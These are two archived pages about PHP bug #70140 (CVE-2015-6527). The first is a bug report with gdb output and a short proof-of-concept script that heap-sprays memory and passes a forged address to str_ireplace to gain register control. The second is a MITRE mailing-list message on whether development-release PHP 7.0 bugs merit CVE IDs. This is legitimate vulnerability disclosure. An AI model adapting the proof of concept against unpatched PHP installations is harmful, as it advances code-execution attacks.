=== Content from bugs.php.net_2c397182_20250125_175705.html ===


| [Bugs](/) | [php.net](https://php.net/) |  [support](https://php.net/support.php) |  [documentation](https://php.net/docs.php) |  [report a bug](report.php) |  [advanced search](search.php) |  [search howto](search-howto.php) |  [statistics](stats.php) |  [random bug](random) |  [login](login.php) |
| --- | --- |
| go to bug id or search bugs for | |

| | [Bug](bug.php?id=70140) #70140 | str\_ireplace/php\_string\_tolower - Arbitrary Code Execution | | | | | | --- | --- | --- | --- | --- | --- | | Submitted: | 2015-07-26 14:15 UTC | Modified: | 2015-08-23 12:27 UTC |  | | From: | fourny dot d at gmail dot com | Assigned: | [laruence](search.php?cmd=display&assign=laruence) ([profile](https://people.php.net/laruence)) | | Status: | Closed | Package: | [Strings related](search.php?cmd=display&package_name[]=Strings+related) | | PHP Version: | 7.0Git-2015-07-26 (Git) | OS: | x86\_64 GNU/Linux | | Private report: | No | CVE-ID: | [2015-6527](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-6527) |   View [Developer](bug.php?id=70140&edit=1) [Edit](bug.php?id=70140&edit=2)   **[2015-07-26 14:15 UTC] fourny dot d at gmail dot com** ``` Description: ------------ Hello,  I discovered a vulnerability issue in this PHP version:  $ php --version PHP 7.0.0-dev (cli) (built: Jul 25 2015 11:31:46) (DEBUG) Copyright (c) 1997-2015 The PHP Group Zend Engine v3.0.0-dev, Copyright (c) 1998-2015 Zend Technologies  In this new version of PHP, it is possible to control some registers and this could be lead to an arbitrary code execution. The problem is in the function "str_ireplace", the third arguments "$subject" type is not checked. Because of that, we can control the assembly registers.  We can check that in gdb:  Breakpoint 1, 0x00000000008139ff in php_string_tolower (s=0x7fff55e00020) at /home/df0/php-src/ext/standard/string.c:1503 1503            e = c + ZSTR_LEN(s); (gdb) x/10i $rip => 0x8139ff <php_string_tolower+29>:    mov    rdx,QWORD PTR [rax+0x10]    0x813a03 <php_string_tolower+33>:    mov    rax,QWORD PTR [rbp-0x18]    0x813a07 <php_string_tolower+37>:    add    rax,rdx    0x813a0a <php_string_tolower+40>:    mov    QWORD PTR [rbp-0x20],rax    0x813a0e <php_string_tolower+44>:    jmp    0x813af2 <php_string_tolower+272>    0x813a13 <php_string_tolower+49>:    call   0x42b2c0 <__ctype_b_loc@plt>    0x813a18 <php_string_tolower+54>:    mov    rdx,QWORD PTR [rax]    0x813a1b <php_string_tolower+57>:    mov    rax,QWORD PTR [rbp-0x18]    0x813a1f <php_string_tolower+61>:    movzx  eax,BYTE PTR [rax]    0x813a22 <php_string_tolower+64>:    movzx  eax,al (gdb) x/10x $rax 0x7fff55e00020: 0x41414141      0x41414141      0x41414141      0x41414141 0x7fff55e00030: 0x41414141      0x41414141      0x41414141      0x41414141 0x7fff55e00040: 0x41414141      0x41414141 (gdb) ni 0x0000000000813a03      1503            e = c + ZSTR_LEN(s); (gdb) x/x $rdx 0x4141414141414141:     Cannot access memory at address 0x4141414141414141  If you have a question, do not hesitate.  Regards, Dimitri Fourny.  Test script: --------------- <?php  // heap spray ini_set("memory_limit", -1); $part = str_repeat("\x41", 4096); $str = str_repeat($part, 10*1024*1024*256/4096);  // the core $a =  "string"; str_ireplace($a, $a, 0x7fff55e00020);  ?>  Actual result: -------------- Program received signal SIGSEGV, Segmentation fault. 0x00000000008139ff in php_string_tolower (s=0x7fff55e00020) at php-src/ext/standard/string.c:1503   ``` PatchesPull RequestsHistoryAllCommentsChangesGit/SVN commitsRelated reports  **[2015-07-27 13:44 UTC] [laruence@php.net](//people.php.net/laruence)** -Status: Open +Status: Closed -Assigned To: +Assigned To: laruence **[2015-07-27 13:44 UTC] [laruence@php.net](//people.php.net/laruence)** ``` fixed in <https://github.com/php/php-src/commit/6aeee47b2cd47915ccfa3b41433a3f57aea24dd5>  ``` **[2015-07-29 10:37 UTC] fourny dot d at gmail dot com** ``` Thank you. Can you make this bug public please?  Regards, Dimitri Fourny.  ``` **[2015-07-29 18:18 UTC] [stas@php.net](//people.php.net/stas)** -Type: Security +Type: Bug **[2015-08-04 20:54 UTC] [ab@php.net](//people.php.net/ab)** ``` Automatic comment on behalf of laruence Revision: <http://git.php.net/?p=php-src.git;a=commit;h=6aeee47b2cd47915ccfa3b41433a3f57aea24dd5> Log: Fixed [bug #70140](bug.php?id=70140) (str_ireplace/php_string_tolower - Arbitrary Code Execution)  ``` **[2015-08-23 12:27 UTC] [kaplan@php.net](//people.php.net/kaplan)** -CVE-ID: +CVE-ID: 2015-6527 **[2016-07-20 11:37 UTC] [davey@php.net](//people.php.net/davey)** ``` Automatic comment on behalf of laruence Revision: <http://git.php.net/?p=php-src.git;a=commit;h=6aeee47b2cd47915ccfa3b41433a3f57aea24dd5> Log: Fixed [bug #70140](bug.php?id=70140) (str_ireplace/php_string_tolower - Arbitrary Code Execution)  ``` |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |

|  | |
| --- | --- |
| [PHP](https://php.net/) [Copyright © 2001-2025 The PHP Group](https://php.net/copyright.php) All rights reserved. | Last updated: Sat Jan 25 17:01:31 2025 UTC |



=== Content from www.openwall.com_81560362_20250125_175700.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](10) [[next>]](12) [[<thread-prev]](10) [[thread-next>]](../../../2015/08/20/7) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-Id: <20150730134312.B369E52E053@smtpvbsrv1.mitre.org>
Date: Thu, 30 Jul 2015 09:43:12 -0400 (EDT)
From: cve-assign@...re.org
To: fourny.d@...il.com
Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
Subject: Re: CVE Request: PHP v7 - Code execution vulnerability

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

It seems possible that CVE IDs for issues affecting only PHP 7.0 would
be useful, but we wanted to send initial thoughts here before
proceeding.

The main concern is that all of the PHP 7.0 announcements have
specifically mentioned "THIS IS A DEVELOPMENT PREVIEW - DO NOT USE IT
IN PRODUCTION!" This is similar, but not identical, to the 'not
directly correspond to a "product"' factor mentioned at the end of the
<http://openwall.com/lists/oss-security/2015/01/04/7> post.

One counterargument is that PHP 7.0, as far as we know, actually is
used in production at a very significant scale. We don't think that
oss-security would be an appropriate place for anyone to announce that
a major closed-source service is based on PHP 7.0. Maybe it's
sufficient to note that some web-hosting providers are advertising PHP
7.0 for general customer use (e.g., the
<https://www.a2hosting.com/php-7-hosting> page) or that there are
non-beta versions of open-source applications that only work with PHP
7.0 (we found <https://github.com/composer/composer/issues/4090> but it
is not a real example).

Unless there is other information, we feel that CVE can include the
70140 issue, but that this doesn't mean that CVE should include every
bug fixed during 7.0 development, even if a security impact is
conceivable.

- --
CVE assignment team, MITRE CVE Numbering Authority
M/S M300
202 Burlington Road, Bedford, MA 01730 USA
[ PGP key available through <http://cve.mitre.org/cve/request_id.html> ]
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQEcBAEBCAAGBQJVuilkAAoJEKllVAevmvmswVUH/1ZexDV4wPGHeja2rQxzItZ1
Ed1sXQNwVXHh89K9hVPJlEQXbj+4ECh83pNh7X5ubkbzAzdHR5miLL80L9dwgjYz
ubAzQ6NndSBlkFpL/EySgoTwXSyGFaZwcwNhx1h/uFtzHWrjWDFYebPMQ//IYIDv
ycyuhniDDKgq5QeF71W7zJp7fkBoY3TDeIV9HP4gOHXhuPM/lpOoCjZ7T30DJpPh
sth35QhtG6KbJX1X9KplcArNS3wChPDmMAb28WImSOEqfDT1JZh/YiQf4a/OPIER
q/PRCJ3u0HNtrfH7Rfj6NTfKa3e7lqXh8SwxYjegEvycjIe6oXU0ZCjDXGIgjBU=
=1jH2
-----END PGP SIGNATURE-----

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).


